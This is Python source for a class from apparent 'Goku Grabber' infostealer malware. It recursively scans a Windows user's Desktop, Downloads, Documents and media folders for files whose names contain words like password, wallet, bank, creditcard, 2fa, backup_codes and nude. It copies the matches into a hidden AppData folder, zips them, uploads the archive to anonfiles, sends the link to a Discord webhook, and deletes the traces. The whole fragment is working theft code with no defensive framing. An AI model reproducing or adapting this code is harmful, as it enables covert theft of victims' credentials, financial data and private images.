class Files:

    def __init__(self):
        self.ZIP = os.mkdir(f"C:\\Users\\{user}\\AppData\\Files")
        self.PTHAY = f"C:\\Users\\{user}\\AppData\\Files"
        self.folders = []
        self.files = 0
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm"]
        self.goal = ["token","webhook","password","passcode","crypto","wallet","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nude","address","backup_codes"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    if fext not in tuple(self.filter):
                                        self.files +=1
                                        shutil.copy(_+"\\"+f,self.PTHAY+"\\"+fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        shutil.make_archive(f"C:\\Users\\{user}\\AppData\\Files","zip",f"C:\\Users\\{user}\\AppData\\Files")
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
        link = file.json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
        embed = DiscordEmbed(title=f"File Grabber", description=f"User's File Grabbed", color='4300d1')
        embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
        embed.set_footer(text='Goku Grabber | by : Goku')
        embed.set_timestamp()
        meowhehe = f""":open_file_folder: ``Files.zip``
``|_``:page_facing_up: ``({self.files}) Files Grabbed``
        """
        embed.add_embed_field(name=meowhehe, value=f"\n\n:file_folder: **ZIP with Grabbed files** : \n**{link}**")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip");shutil.rmtree(f"C:\\Users\\{user}\\AppData\\Files")